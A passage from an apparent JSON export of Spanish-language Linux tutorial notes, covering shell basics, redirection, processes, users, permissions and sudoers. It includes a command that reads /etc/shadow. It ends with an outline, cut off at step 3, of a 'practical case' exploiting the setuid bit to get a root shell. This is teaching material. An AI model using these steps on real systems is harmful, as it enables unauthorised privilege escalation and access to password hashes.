ejecución\r\nps\r\n# Limitar la memoria de un proceso concreto por su PID\r\nprlimit --as=1000 --pid 1234\r\n```",
    "path": "/linux/file-system"
  },
  {
    "id": 14,
    "title": "Linux. Introducción",
    "content": "\r\n# Linux. Introducción\r\n\r\n## Shell. Comandos básicos\r\n\r\n```zsh\r\n# Limpiar la consola\r\nclear\r\n# Ver historial de comandos utilizados\r\nhistory\r\n# Lista el directorio actual\r\nls\r\n# Tipo de comando\r\ntype ls\r\n# Con parámetros (l = long list, s = size, h = human readable)\r\nls -lah\r\n# Información de un comando de \"shell\"\r\nhelp type\r\n# Información de  un comando que \"no es de shell\"\r\nls --help\r\n# Manual de un comando\r\nman ls\r\n# Para que es un comando\r\nwhatis ls\r\n# Información detallada de un comando\r\ninfo ls\r\n# Buscar comandos por palabra clave\r\napropos directory\r\napropos \"list directory\"\r\n# Partir un comando en varias líneas\r\nls \\\r\n-lah\r\nDirectory\r\n# Concatenar comandos\r\nclear ; ls\r\n# Operador AND (&&)\r\ndsfasfasdf && ls\r\n# Operador OR (||)\r\nlkajsdfasdf || ls\r\n```\r\n\r\n## Shell. Atajos\r\n\r\n```sh\r\n# Ir a inicio de línea\r\nControl + a\r\n# Ir al final de línea\r\nControl + e\r\n# Limpiar pantalla\r\nControl + l\r\n# Últimos comandos utilizados\r\nControl + p\r\n# Buscar comandos utilizados\r\nControl + r\r\n# Utilizar el último comando que machea (coincide)\r\n!ls\r\n# Moverse derecha/izquierda\r\nControl + b # back\r\nControl + f # forward\r\n# Argumento último comando\r\nAlt + .\r\n$!\r\n# Autocompletar comandos\r\nTab\r\n# Cortar la línea (situado al inicio)\r\nControl + k\r\n# Pegar la línea\r\nControl + y\r\n# Copiar/pegar texto con ratón\r\nSeleccionar texto + ruleta\r\n# Convertir mayúsculas/minúsculas\r\nAlt + l/u\r\n# Intercambiar 2 últimos caracteres\r\nControl + t\r\n# Intercambiar 2 últimas palabras\r\nEsc + t\r\n```\r\n\r\n## Shell. Alias\r\n\r\n```sh\r\n# Crear un Alias\r\nalias clist='clear ; ls'\r\n# Conecer Alias en la sesión\r\nalias\r\n```\r\n\r\n## Shell. Is Hashed\r\n\r\nEs una tabla de referencias a comandos para acceder a ellos mucho más rápido\r\n\r\n```sh\r\n# Mostrar tabla de hash de la sesión actual\r\nhash\r\n# Limpiar la tabla para la sesióna actual\r\nhash -a\r\n```\r\n",
    "path": "/linux/intro"
  },
  {
    "id": 15,
    "title": "Linux. Redirecciones y pipelines",
    "content": "\r\n# Linux. Redirecciones y pipelines\r\n\r\n## I/O Redirection\r\n\r\nLa redirección de entrada/salida (I/O) es un mecanismo que permite cambiar la fuente o el destino de los flujos de entrada y salida de un comando en un sistema operativo Unix/Linux. Los flujos de entrada y salida estándar son:\r\n\r\n- /dev/stdin: entrada estándar\r\n- /dev/stdout: salida estándar\r\n- /dev/stderr: salida de error\r\n\r\n## Standard Output (stdout)\r\n\r\nLa redirección de la salida estándar (stdout) permite enviar la salida de un comando a un archivo en lugar de a la pantalla. Para redirigir la salida estándar a un archivo, se utiliza el operador `>` seguido del nombre del archivo.\r\n\r\n```sh\r\n# Redirigir la salida estándar a un archivo\r\ncomando > archivo\r\n# Concatenar la salida estándar a un archivo\r\ncomando >> archivo\r\n```\r\n\r\n## Standard Error (stderr)\r\n\r\nLa redirección de la salida de error (stderr) permite enviar los mensajes de error generados por un comando a un archivo en lugar de a la pantalla. Para redirigir la salida de error a un archivo, se utiliza el operador `2>` seguido del nombre del archivo.\r\n\r\n```sh\r\n# Redirigir la salida de error a un archivo\r\ncomando 2> archivo\r\n# Concatenar la salida de error a un archivo\r\ncomando 2>> archivo\r\n```\r\n\r\n### Redirección de la salida estándar y de error\r\n\r\nLa redirección de la salida estándar y de error permite enviar tanto la salida estándar como la salida de error a un archivo. Para redirigir la salida estándar y de error a un archivo, se utiliza el operador `&>` seguido del nombre del archivo.\r\n\r\n```sh\r\n# Redirigir la salida estándar y de error a un archivo\r\ncomando &> archivo\r\n# Concatenar la salida estándar y de error a un archivo\r\ncomando &>> archivo\r\n# Antiguamente\r\ncomando > archivo 2>&1\r\n```\r\n\r\n## /dev/null\r\n\r\nEl archivo especial `/dev/null` es un dispositivo de nulo que descarta toda la entrada que recibe y devuelve un final de archivo (EOF, End Of File) inmediatamente. Se utiliza para redirigir la salida estándar o de error a la nada.\r\n\r\n```sh\r\n# Redirigir la salida estándar a /dev/null\r\ncomando > /dev/null\r\n# Redirigir la salida de error a /dev/null\r\ncomando 2> /dev/null\r\n# Redirigir la salida estándar y de error a /dev/null\r\ncomando &> /dev/null\r\n# Ejemplo: redirigir la salida de error a /dev/null\r\nfind /var/log -name auth.log 2> /dev/null\r\n```\r\n\r\n## Standar Input (stdin)\r\n\r\nLa redirección de la entrada estándar (stdin) permite enviar un archivo como entrada a un comando en lugar de introducir los datos manualmente. Para redirigir la entrada estándar a un comando, se utiliza el operador `<` seguido del nombre del archivo.\r\n\r\n>cat recibe la entrada estándar y la imprime en la salida estándar.\r\n\r\n```sh\r\n# Redirigir la entrada estándar a un comando\r\ncomando < archivo\r\n# Ejemplo: contar las líneas de un archivo\r\nwc -l < archivo\r\n# Añadir varias líneas a un archivo\r\ncat << EOF > archivo\r\nlínea 1\r\nlínea 2\r\nEOF\r\n# Sin EOF\r\ncat > archivo\r\n```\r\n\r\n## Pipelines\r\n\r\nUn pipeline es una secuencia de comandos conectados por tuberías (pipes) que permite enviar la salida de un comando como entrada a otro comando. Para crear un pipeline, se utiliza el operador `|` entre los comandos.\r\n\r\n>xargs: convierte la salida de un comando en argumentos de otro comando.\r\n\r\n```sh\r\n# Pipeline: comando1 | comando2\r\ncomando1 | comando2\r\n# Ejemplo: contar las líneas de un archivo\r\ncat archivo | wc -l\r\n# Ejemplo: buscar un archivo y contar las líneas\r\nfind /var/log -name auth.log | xargs wc -l\r\n# Ejemplo con ls\r\nls -l /usr/bin | less\r\n```\r\n\r\n## Filtros y búsquedas: sort, uniq, wc\r\n\r\nLos filtros y búsquedas son comandos que permiten manipular y buscar información en los flujos de entrada y salida. Algunos de los filtros y búsquedas más comunes son:\r\n\r\n- `sort`: Ordena las líneas de un archivo.\r\n- `uniq`: Filtra líneas duplicadas consecutivas.\r\n- `wc`: Cuenta las líneas, palabras y caracteres de un archivo.\r\n\r\n```sh\r\n# Ordenar las líneas de un archivo\r\nsort archivo\r\n# Filtrar líneas duplicadas consecutivas\r\nuniq archivo\r\n# Contar las líneas, palabras y caracteres de un archivo\r\nwc archivo\r\n# Ejemplo de ls + sort + uniq + less\r\nls -l /bin /usr/bin | sort | uniq | less\r\n# Ver los duplicados de anterior\r\nls -l /bin /usr/bin | sort | uniq -d | less\r\n# Ejemplo de wc\r\n# Salida: líneas palabras caracteres archivo\r\nwc /var/log/auth.log\r\n# Cuantos ficheros hay en /usr/bin\r\nls -l /bin /usr/bin | uniq | wc -l\r\n```\r\n\r\n## Filtros y búsquedas: grep, head, tail, tee\r\n\r\nOtros filtros y búsquedas comunes son:\r\n\r\n- `grep`: Busca líneas que contienen un patrón.\r\n- `head`: Muestra las primeras líneas de un archivo.\r\n- `tail`: Muestra las últimas líneas de un archivo.\r\n- `tee`: Divide la salida de un comando en un archivo y la pantalla.\r\n\r\n```sh\r\n# Buscar líneas que contienen un patrón\r\ngrep patrón archivo\r\n# Mostrar las primeras líneas de un archivo\r\nhead archivo\r\n# Mostrar las últimas líneas de un archivo\r\ntail archivo\r\n# Dividir la salida de un comando en un archivo y la pantalla\r\ncomando | tee archivo\r\n# Ejemplo de grep\r\ngrep $USER /var/log/auth.log\r\n# Ejemplo de grep ignorando mayúsculas y minúsculas\r\ngrep -i $USER /var/log/auth.log\r\n# Ejemplo de grep ignorando líneas que contienen un patrón\r\ngrep -v $USER archivo\r\n# Ejemplo de head\r\nhead -n 10 /var/log/auth.log\r\n# Ejemplo de tail\r\ntail -n 10 /var/log/auth.log\r\n# Ver cambios de fichero en tiempo real con tail\r\ntail -f /var/log/auth.log\r\n# Ejemplo de tee\r\nls -l /usr/bin | tee lista.txt\r\n# tee para volcar la salida de un comando a un fichero y a la salida estándar\r\nls -l /usr/bin | tee lista.txt | less\r\n```\r\n\r\n## Ejercicios\r\n\r\n- Muestra por pantalla todos los archivos y directorios que tienes en tu directorio de trabajo ordenados por tamaño\r\n\r\n```sh\r\nls -lS ~\r\nls -l ~ | sort -h -rk5\r\n# h human readable\r\n# r reverse\r\n# k key\r\n```\r\n\r\n- Crea un nuevo fichero en tu sistema Linux ejecutando el siguiente comando:\r\n\r\n> echo -e \"rojo,1,coche,madrid\\nazul,4,moto,mexico\\namarillo,2,bicicleta,paris\\nverde,6,avion,roma\" > fichero.csv\r\n\r\nOrdena el fichero que acabas de crear (fichero.csv) por el segundo campo teniendo en cuenta que los campos están separados por el delimitador ,\r\n\r\n```sh\r\nsort -t ',' -nk2 fichero.csv\r\n# t delimitador\r\n# n numérico\r\n# k key\r\n```\r\n\r\n## Comando sed\r\n\r\nEl comando `sed` (stream editor) es un editor de flujo que permite realizar operaciones de búsqueda y sustitución en un flujo de texto. Algunas de las operaciones más comunes que se pueden realizar con `sed` son:\r\n\r\n- `s`: Sustituye un patrón por otro.\r\n- `d`: Borra líneas que coinciden con un patrón.\r\n- `p`: Imprime líneas que coinciden con un patrón.\r\n\r\n```sh\r\n# Sustituir un patrón por otro\r\nsed 's/patrón/sustitución/' archivo\r\n# Sustituir todas las ocurrencias de un patrón\r\nsed 's/patrón/sustitución/g' archivo\r\n# Sustituir un patrón por otro en un rango de líneas\r\nsed 'inicio,fin s/patrón/sustitución/' archivo\r\n# Sustituir un patrón por otro en un rango de líneas y guardar el resultado en un nuevo archivo\r\nsed 'inicio,fin s/patrón/sustitución/' archivo > nuevo_archivo\r\n# Borrar líneas que coinciden con un patrón\r\nsed '/patrón/d' archivo\r\n# Imprimir líneas que coinciden con un patrón\r\nsed -n '/patrón/p' archivo\r\n# Imprimir líneas que coinciden con un patrón y guardar el resultado en un nuevo archivo\r\nsed -n '/patrón/p' archivo > nuevo_archivo\r\n```\r\n\r\n### Ejemplos de uso de sed\r\n\r\n- Reemplazar o sustituir una cadena de texto en un fichero\r\n\r\n```sh\r\nsed 's/rojo/azul/g' fichero.txt\r\n```\r\n\r\n- Reemplazar una cadena de texto en una línea determinada de un fichero\r\n\r\n```sh\r\nsed '2 s/rojo/azul/' fichero.txt\r\n```\r\n\r\n- Añadir un carácter al comienzo de cada línea de un fichero\r\n\r\n```sh\r\nsed 's/^/-->/g' fichero.txt\r\n```\r\n",
    "path": "/linux/io-redirection"
  },
  {
    "id": 16,
    "title": "Linux. Procesos",
    "content": "\r\n# Linux. Procesos\r\n\r\n## Introducción\r\n\r\nUn proceso es un programa en ejecución. Cada proceso tiene un identificador único llamado PID (Process IDentifier). Los procesos se crean mediante la llamada al sistema `fork()`. El proceso que llama a `fork()` se denomina proceso padre y el proceso creado se denomina proceso hijo. El proceso hijo es una copia exacta del proceso padre, pero con un PID diferente. El proceso hijo puede ejecutar un programa diferente al del proceso padre mediante la llamada al sistema `exec()`. El proceso hijo puede terminar su ejecución mediante la llamada al sistema `exit()`. El proceso padre puede esperar a que el proceso hijo termine su ejecución mediante la llamada al sistema `wait()`.\r\n\r\n> **Nota**: En Linux, los procesos se organizan en un árbol de procesos. El proceso raíz es el proceso init, que es el primer proceso que se ejecuta en el sistema. Todos los demás procesos son descendientes de init.\r\n\r\nLos procesos se encuentran en el directorio `/proc`. Cada proceso tiene un directorio con su PID como nombre. En este directorio se encuentran varios archivos que contienen información sobre el proceso, como el estado del proceso, el uso de la CPU, la memoria, los archivos abiertos, etc.\r\n\r\nCon el comando `pidof` se puede obtener el PID de un proceso a partir de su nombre. Por ejemplo, para obtener el PID del proceso `bash` se puede ejecutar el siguiente comando:\r\n\r\n```sh\r\n# pidof\r\n\r\n```\r\n\r\n## Visualización estática\r\n\r\n- PID: Identificador del proceso.\r\n- PPID: Identificador del proceso padre.\r\n- UID: Identificador del usuario que ha lanzado el proceso.\r\n- STIME: Hora de inicio del proceso.\r\n- %CPU: Porcentaje de uso de la CPU.\r\n- %MEM: Porcentaje de uso de la memoria.\r\n- VSZ: Tamaño virtual del proceso.\r\n- RSS: Tamaño real del proceso.\r\n- TTY: Terminal asociada al proceso.\r\n- STAT: Estado del proceso.\r\n    - R: Ejecución.\r\n    - S: Sueño.\r\n    - T: Parado.\r\n    - Z: Zombie.\r\n    - s: Proceso líder de sesión.\r\n    - +: Proceso en segundo plano.\r\n    - \\<: Proceso de alta prioridad.\r\n    - N: Proceso con baja prioridad.\r\n    - l: Proceso multihilo.\r\n- TIME: Tiempo de CPU consumido por el proceso.\r\n- CMD: Comando que se está ejecutando.\r\n\r\n```bash\r\n# Procesos asociados a la terminal actual\r\nps\r\n# Procesos de todos los usuarios\r\nps -e\r\n# Procesos de todos los usuarios con más información\r\nps -ef\r\n# Procesos de todos los usuarios con más información y árbol de procesos\r\nps -ef --forest\r\n# Más información sobre los procesos\r\nps aux | less\r\n```\r\n\r\n## Visualización dinámica\r\n\r\n- top: hora de inicio del proceso.\r\n- up: tiempo que lleva el sistema en funcionamiento.\r\n- load average: carga media del sistema en los últimos 1, 5 y 15 minutos.\r\n- tasks: número de tareas en ejecución, en espera y detenidas.\r\n- %Cpu(s): porcentaje de uso de la CPU.\r\n- Mem: memoria total, usada, libre, compartida, búfer y caché.\r\n- Swap: memoria de intercambio total, usada y libre.\r\n- PID: identificador del proceso.\r\n- USER: usuario que ha lanzado el proceso.\r\n- PR: prioridad del proceso.\r\n- NI: nivel de planificación del proceso.\r\n- VIRT: tamaño virtual del proceso.\r\n- RES: tamaño real del proceso.\r\n- SHR: tamaño compartido del proceso.\r\n- S: estado del proceso.\r\n- %CPU: porcentaje de uso de la CPU.\r\n- %MEM: porcentaje de uso de la memoria.\r\n- TIME+: tiempo de CPU consumido por el proceso.\r\n- COMMAND: comando que se está ejecutando.\r\n\r\n\r\n\r\n```bash\r\n# Actualizar la información cada 1 segundo\r\ntop\r\n# Top abierto. Tiempo de actualización\r\ns\r\n# Top abierto. Cambiar unidad de consumo\r\ne\r\n# Top abierto. Filtrar por usuario\r\nu\r\n# Top abierto. Filtro personalizado\r\no # Por ejemplo, %CPU > 2\r\n```\r\n\r\n## Interrumpir procesos\r\n\r\n- Ctrl + C: enviar la señal SIGINT al proceso. El proceso se detiene y se envía al segundo plano.\r\n- Ctrl + Z: enviar la señal SIGTSTP al proceso. El proceso se detiene y se envía al segundo plano.\r\n- kill: enviar una señal a un proceso. Por defecto, envía la señal SIGTERM.\r\n- killall: enviar una señal a todos los procesos que coincidan con un nombre. Por defecto, envía la señal SIGTERM.\r\n- pkill: enviar una señal a todos los procesos que coincidan con un patrón. Por defecto, envía la señal SIGTERM.\r\n- xkill: matar un proceso con el ratón. Seleccionar la ventana del proceso y hacer clic en ella.\r\n\r\n```bash\r\n# Reaunudar un proceso detenido\r\nbg %1\r\n# Enviar la señal SIGINT al proceso\r\nkill -2 PID\r\n# Enviar la señal SIGKILL al proceso\r\nkill -9 PID\r\n# Enviar la señal SIGTERM al proceso\r\nkill -15 PID\r\n# Enviar la señal SIGSTOP al proceso\r\nkill -19 PID\r\n# Enviar la señal SIGCONT al proceso\r\nkill -18 PID\r\n# Enviar la señal SIGTSTP al proceso\r\nkill -20 PID # Ctrl + Z\r\nkill -TSTP PID\r\n```\r\n\r\n# Segundo plano\r\n\r\nUn proceso en segundo plano es un proceso que se ejecuta en segundo plano sin bloquear la terminal. Para ejecutar un proceso en segundo plano, se añade el carácter `&` al final del comando. Para enviar un proceso en primer plano a segundo plano, se ejecuta el comando `bg`. Para enviar un proceso en segundo plano a primer plano, se ejecuta el comando `fg`.\r\n\r\n```bash\r\n# Ejecutar un proceso en segundo plano\r\nsleep 10 &\r\n# Enviar un proceso en primer plano a segundo plano\r\nbg %1\r\n# Ver los procesos en segundo plano\r\njobs\r\n# Enviar un proceso en segundo plano a primer plano\r\nfg %1\r\n```\r\n\r\n# Señales (Signals)\r\n\r\nLas señales son mensajes que se envían a un proceso para notificarle un evento. Las señales se pueden enviar a un proceso mediante el comando `kill`. Algunas señales comunes son:\r\n\r\n- SIGINT: señal de interrupción. Se envía al pulsar Ctrl + C.\r\n- SIGTSTP: señal de parada. Se envía al pulsar Ctrl + Z.\r\n\r\n",
    "path": "/linux/process"
  },
  {
    "id": 17,
    "title": "Herramientas",
    "content": "\r\n# Herramientas\r\n\r\n## Análisis forense\r\n\r\n- [Autopsy](https://www.sleuthkit.org/autopsy/)\r\n",
    "path": "/linux/tools"
  },
  {
    "id": 18,
    "title": "Linux. Usuarios y permisos",
    "content": "\r\n# Linux. Usuarios y permisos\r\n\r\n## passwd, shadow, group\r\n\r\nLos usuarios y grupos de un sistema Linux se gestionan a través de los archivos `/etc/passwd`, `/etc/shadow` y `/etc/group`.\r\n\r\nCon el comando **id** se puede obtener información sobre el usuario actual:\r\n\r\n- UID: Identificador de usuario\r\n- GID: Identificador de grupo\r\n- Grupos: Grupos a los que pertenece el usuario\r\n\r\n```sh\r\nid\r\n```\r\n\r\n### /etc/passwd\r\n\r\nEl archivo `/etc/passwd` contiene información sobre los usuarios del sistema. Cada línea del archivo representa un usuario y contiene los siguientes campos separados por dos puntos `:`:\r\n\r\n1. Nombre de usuario\r\n2. Contraseña (se utiliza `x` para indicar que la contraseña está en el archivo `/etc/shadow`)\r\n3. UID (User ID)\r\n4. GID (Group ID)\r\n5. Nombre completo del usuario\r\n6. Directorio de inicio\r\n7. Intérprete de comandos\r\n\r\n```sh\r\ncat /etc/passwd\r\n```\r\n\r\n### /etc/shadow\r\n\r\nEl archivo `/etc/shadow` contiene información sobre las contraseñas de los usuarios del sistema. Cada línea del archivo representa un usuario y contiene los siguientes campos separados por dos puntos `:`:\r\n\r\n1. Nombre de usuario\r\n2. Contraseña cifrada\r\n3. Fecha de último cambio de contraseña\r\n4. Días mínimos entre cambios de contraseña\r\n5. Días máximos entre cambios de contraseña\r\n6. Días de advertencia antes de que la contraseña caduque\r\n7. Días de inactividad antes de que la cuenta se bloquee\r\n8. Fecha de caducidad de la cuenta\r\n9. Cuenta bloqueada\r\n\r\n```sh\r\ncat /etc/shadow\r\n```\r\n\r\n### /etc/group\r\n\r\nEl archivo `/etc/group` contiene información sobre los grupos del sistema. Cada línea del archivo representa un grupo y contiene los siguientes campos separados por dos puntos `:`:\r\n\r\n1. Nombre de grupo\r\n2. Contraseña (se utiliza `x` para indicar que la contraseña está en el archivo `/etc/gshadow`)\r\n3. GID (Group ID)\r\n4. Lista de usuarios que pertenecen al grupo\r\n\r\n```sh\r\ncat /etc/group\r\n```\r\n\r\n## Lectura (r), Escritura (w) y Ejecución (x)\r\n\r\nLos permisos de un archivo o directorio se dividen en tres categorías: propietario, grupo y otros. Cada categoría tiene tres permisos: lectura (r), escritura (w) y ejecución (x).\r\n\r\n<u>Existen 3 grupos de permisos:</u>\r\n\r\n- **Propietario**: Permisos del usuario propietario del archivo o directorio.\r\n- **Grupo**: Permisos del grupo al que pertenece el archivo o directorio.\r\n- **Otros**: Permisos para el resto de usuarios.\r\n\r\n### Permisos de archivos\r\n\r\n- `-`: Sin permisos\r\n- `r`: Lectura. Permite ver el contenido del archivo.\r\n- `w`: Escritura. Permite modificar el contenido del archivo.\r\n- `x`: Ejecución. Permite ejecutar el archivo si es un script o programa.\r\n\r\n### Permisos de directorios\r\n\r\n- `-`: Sin permisos\r\n- `r`: Lectura. Permite ver el contenido del directorio.\r\n- `w`: Escritura. Permite modificar el contenido del directorio (crear, borrar archivos).\r\n- `x`: Ejecución. Permite acceder al contenido del directorio.\r\n\r\n:::note\r\nTener permiso de lectura o escritura en un directorio sin permiso de ejecución no es útil. Tener permiso de ejecución pero no de lectura es ocasionalmente útil: permite acceder a los archivos sólo si se conoce su nombre exacto, un mecanismo muy rudimentario de protección.\r\n:::\r\n\r\n```sh\r\n# Permisos de un archivo\r\nls -l archivo\r\n```\r\n## Usuario ROOT\r\n\r\nEl usuario **root** es el superusuario del sistema Linux y tiene todos los permisos. Se identifica con el UID 0 y puede realizar cualquier operación en el sistema.\r\n\r\nPara cambiar al usuario root se utiliza el comando **su** (substitute user) o **sudo** (superuser do).\r\n\r\n```sh\r\n# Cambiar al usuario root\r\nsu\r\n# Cambiar al usuario root con sudo\r\nsudo su\r\n```\r\n\r\n:::warning\r\nEl usuario root tiene acceso total al sistema y puede realizar cambios que afecten al funcionamiento del sistema. Se recomienda utilizar el usuario root con precaución.\r\nUn administrador de sistemas debe utilizar el usuario root sólo cuando sea necesario y preferiblemente utilizar sudo para ejecutar comandos con privilegios de superusuario.\r\n:::\r\n\r\n## Cambiar permisos en octal\r\n\r\nLos permisos de un archivo o directorio se pueden cambiar utilizando el comando **chmod** (change mode) seguido de un número octal que representa los permisos.\r\n\r\n- **4**: Lectura (r)\r\n- **2**: Escritura (w)\r\n- **1**: Ejecución (x)\r\n\r\nLa suma de los números representa los permisos de la siguiente forma:\r\n\r\n- **0**: Sin permisos\r\n- **1**: Ejecución\r\n- **2**: Escritura\r\n- **3**: Escritura y ejecución\r\n- **4**: Lectura\r\n- **5**: Lectura y ejecución\r\n- **6**: Lectura y escritura\r\n- **7**: Lectura, escritura y ejecución\r\n\r\n```sh\r\n# Cambiar permisos de un archivo a 644\r\nchmod 644 archivo\r\n# Cambiar permisos de un directorio a 755\r\nchmod 755 directorio\r\n```\r\n\r\n## Cambiar permisos con símbolos\r\n\r\nLos permisos de un archivo o directorio se pueden cambiar utilizando el comando **chmod** seguido de los símbolos `+` (añadir) o `-` (quitar) y los permisos a modificar.\r\n\r\n- **u**: Propietario\r\n- **g**: Grupo\r\n- **o**: Otros\r\n- **a**: Todos\r\n\r\n- **r**: Lectura\r\n- **w**: Escritura\r\n- **x**: Ejecución\r\n\r\n```sh\r\n# Añadir permiso de escritura al grupo\r\nchmod g+w archivo\r\n# Quitar permiso de ejecución a otros\r\nchmod o-x archivo\r\n```\r\n\r\n## Permisos por defecto: umask\r\n\r\nEl comando **umask** (user file creation mask) establece los permisos por defecto para los archivos y directorios creados por un usuario.\r\n\r\nEl valor de umask se resta a los permisos máximos (777 para directorios y 666 para archivos) para obtener los permisos reales.\r\n\r\n```sh\r\n# Ver el valor de umask\r\numask\r\n# Establecer umask a 022\r\numask 022\r\n```\r\n\r\n## Setuid, Setgid y Sticky Bit\r\n\r\n- **Setuid (s)**: Permite que un archivo se ejecute con los permisos del propietario.\r\n- **Setgid (s)**: Permite que un archivo se ejecute con los permisos del grupo.\r\n- **Sticky Bit (t)**: Permite que sólo el propietario pueda borrar o mover archivos en un directorio.\r\n\r\nEn la notación octal, el setuid se representa con el bit **4**, el setgid con el bit **2** y el sticky bit con el bit **1**.\r\n\r\n```sh\r\n# Establecer setuid en un archivo\r\nchmod u+s archivo\r\n# Establecer setgid en un archivo\r\nchmod g+s archivo\r\n# Establecer sticky bit en un directorio\r\nchmod +t directorio\r\n```\r\n\r\n## Cambio de identidad: su\r\n\r\nEl comando **su** (substitute user) permite cambiar de usuario en un terminal. Si se ejecuta sin argumentos, cambia al usuario root.\r\n\r\n```sh\r\n# Crear un nuevo usuario\r\nsudo adduser usuario\r\n# Cambiar al usuario root\r\nsu\r\n# Cambiar a otro usuario\r\nsu usuario\r\n# Cambiar a otro usuario moviendo el directorio de trabajo\r\nsu - usuario\r\n```\r\n\r\n### Ejecutar comandos en nombre de otro usuario\r\n\r\nPara ejecutar un comando en nombre de otro usuario se puede utilizar el comando **su** o **sudo**.\r\n\r\n```sh\r\n# Ejecutar un comando en nombre de otro usuario\r\nsu -c \"comando\" usuario\r\n# Ejecutar un comando en nombre de otro usuario con sudo\r\nsudo -u usuario comando\r\n```\r\n\r\n## sudo\r\n\r\nEl comando **sudo** (superuser do) permite ejecutar comandos con privilegios de superusuario. Para utilizar sudo es necesario añadir el usuario al grupo sudo.\r\n\r\n```sh\r\n# Añadir un usuario al grupo sudo\r\nsudo usermod -aG sudo usuario\r\n# Ejecutar un comando con sudo\r\nsudo comando\r\n# Shell interactiva con sudo\r\nsudo -i\r\n```\r\n\r\n## sudoers\r\n\r\nEl archivo `/etc/sudoers` contiene la configuración de sudo y permite definir qué usuarios pueden ejecutar comandos con sudo y qué comandos pueden ejecutar.\r\n\r\nPara editar el archivo sudoers se utiliza el comando **visudo**.\r\n\r\n```sh\r\n# Editar el archivo sudoers\r\nsudo visudo\r\n```\r\n\r\n### Privilegios por defecto\r\n\r\n- root ALL=(ALL:ALL) ALL: Permite a root ejecutar cualquier comando en cualquier host.\r\n- %admin ALL=(ALL:ALL) ALL: Permite a los miembros del grupo admin ejecutar cualquier comando en cualquier host.\r\n- %sudo ALL=(ALL:ALL) ALL: Permite a los miembros del grupo sudo ejecutar cualquier comando en cualquier host.\r\n\r\n### Desglose de la configuración\r\n\r\n- **root**: Usuario o grupo al que se aplican los privilegios.\r\n- **ALL**: Host al que se aplican los privilegios. Puede ser un nombre de host o ALL para todos los hosts.\r\n- **(ALL:ALL)**: Usuario y grupo al que se cambia al ejecutar el comando.\r\n- **ALL**: Comando que se puede ejecutar.\r\n\r\n### Ejemplos\r\n\r\n- `usuario ALL=(ALL:ALL) ALL`: Permite a un usuario ejecutar cualquier comando en cualquier host.\r\n- `%grupo ALL=(ALL:ALL) ALL`: Permite a los miembros de un grupo ejecutar cualquier comando en cualquier host.\r\n- `usuario ALL=(ALL) /bin/ls`: Permite a un usuario ejecutar el comando `/bin/ls` en cualquier host.\r\n- `usuario ALL=(ALL) NOPASSWD: /bin/ls`: Permite a un usuario ejecutar el comando `/bin/ls` en cualquier host sin contraseña.\r\n- `usuario ALL=(ALL) /bin/ls, /bin/cat`: Permite a un usuario ejecutar los comandos `/bin/ls` y `/bin/cat` en cualquier host.\r\n- `usuario ALL=(ALL) /bin/*`: Permite a un usuario ejecutar todos los comandos en `/bin` en cualquier host.\r\n- `usuario ALL=(ALL) /bin/*, !/bin/sh`: Permite a un usuario ejecutar todos los comandos en `/bin` excepto `/bin/sh` en cualquier host.\r\n- `usuario ALL=(ALL) /bin/*, !/bin/sh, !/bin/su`: Permite a un usuario ejecutar todos los comandos en `/bin` excepto `/bin/sh` y `/bin/su` en cualquier host.\r\n\r\n## Gestión de Usuarios y Grupos\r\n\r\n### Añadir un nuevo usuario\r\n\r\nPara añadir un nuevo usuario se utiliza el comando **adduser**.\r\n\r\n```sh\r\n# Añadir un nuevo usuario\r\nsudo adduser usuario\r\n# Avanzado\r\nsudo adduser --home /home/usuario --shell /bin/bash usuario\r\n```\r\n\r\n### Añadir un nuevo grupo\r\n\r\nPara añadir un nuevo grupo se utiliza el comando **groupadd**.\r\n\r\n```sh\r\n# Añadir un nuevo grupo\r\nsudo addgroup grupo\r\n# Avanzado\r\nsudo groupadd --gid 1000 grupo\r\n```\r\n\r\n### Mostrar grupos\r\n\r\nPara mostrar los grupos a los que pertenece un usuario se utiliza el comando **groups**.\r\n\r\n```sh\r\n# Mostrar los grupos de un usuario\r\ngroups usuario\r\nid usuario\r\n# Mostrar todos los grupos del sistema\r\ncat /etc/group\r\n```\r\n\r\n### Añadir a un grupo\r\n\r\nPara añadir un usuario a un grupo se utiliza el comando **usermod**.\r\n\r\n```sh\r\n# Añadir un usuario a un grupo\r\nsudo usermod -aG grupo usuario\r\n```\r\n\r\n### Cambiar grupo primario\r\n\r\nPara cambiar el grupo primario de un usuario se utiliza el comando **usermod**.\r\n\r\n```sh\r\n# Cambiar el grupo primario de un usuario\r\nsudo usermod -g grupo usuario\r\n```\r\n\r\n### Cambiar nombre\r\n\r\nPara cambiar el nombre de un usuario se utiliza el comando **usermod**.\r\n\r\n```sh\r\n# Cambiar el nombre de un usuario\r\nsudo usermod -l nuevo_usuario usuario\r\n```\r\n\r\n### Cambiar home\r\n\r\nPara cambiar el directorio de inicio de un usuario se utiliza el comando **usermod**.\r\n\r\n```sh\r\n# Cambiar el directorio de inicio de un usuario\r\nsudo usermod -d /nuevo/home usuario\r\n```\r\n\r\n### Cambiar el id\r\n\r\nPara cambiar el identificador de un usuario se utiliza el comando **usermod**.\r\n\r\n```sh\r\n# Cambiar el identificador de un usuario\r\nsudo usermod -u 1000 usuario\r\n```\r\n\r\n### Cambiar la contraseña\r\n\r\nPara cambiar la contraseña de un usuario se utiliza el comando **passwd**.\r\n\r\n```sh\r\n# Cambiar la contraseña de un usuario\r\nsudo passwd usuario\r\n```\r\n\r\n### Eliminar un grupo\r\n\r\nPara eliminar un grupo se utiliza el comando **groupdel**.\r\n\r\n```sh\r\n# Eliminar un grupo\r\nsudo groupdel grupo\r\n```\r\n\r\n### Eliminar un usuario\r\n\r\nPara eliminar un usuario se utiliza el comando **userdel**.\r\n\r\n```sh \r\n# Eliminar un usuario\r\nsudo userdel usuario\r\n```\r\n\r\n## Cambio de propietario y grupo\r\n\r\nEl comando **chown** (change owner) permite cambiar el propietario y el grupo de un archivo o directorio.\r\n\r\n```sh\r\n# Cambiar el propietario de un archivo\r\nsudo chown usuario archivo\r\n# Cambiar el grupo de un archivo\r\nsudo chown :grupo archivo\r\n# Cambiar el propietario y el grupo de un archivo\r\nsudo chown usuario:grupo archivo\r\n```\r\n\r\n### chgrp\r\n\r\nEl comando **chgrp** (change group) permite cambiar el grupo de un archivo o directorio.\r\n\r\n```sh\r\n# Cambiar el grupo de un archivo\r\nsudo chgrp grupo archivo\r\n```\r\n\r\n## Caso práctico: Explotando el bit setuid\r\n\r\nEl bit setuid permite que un archivo se ejecute con los permisos del propietario. En este caso práctico se explota el bit setuid para obtener una shell con privilegios de superusuario.\r\n\r\n1. Crear un archivo con un programa que cambie el UID a 0 y ejecute una shell.\r\n2. Compilar el archivo y establecer el bit setuid.\r\n3. 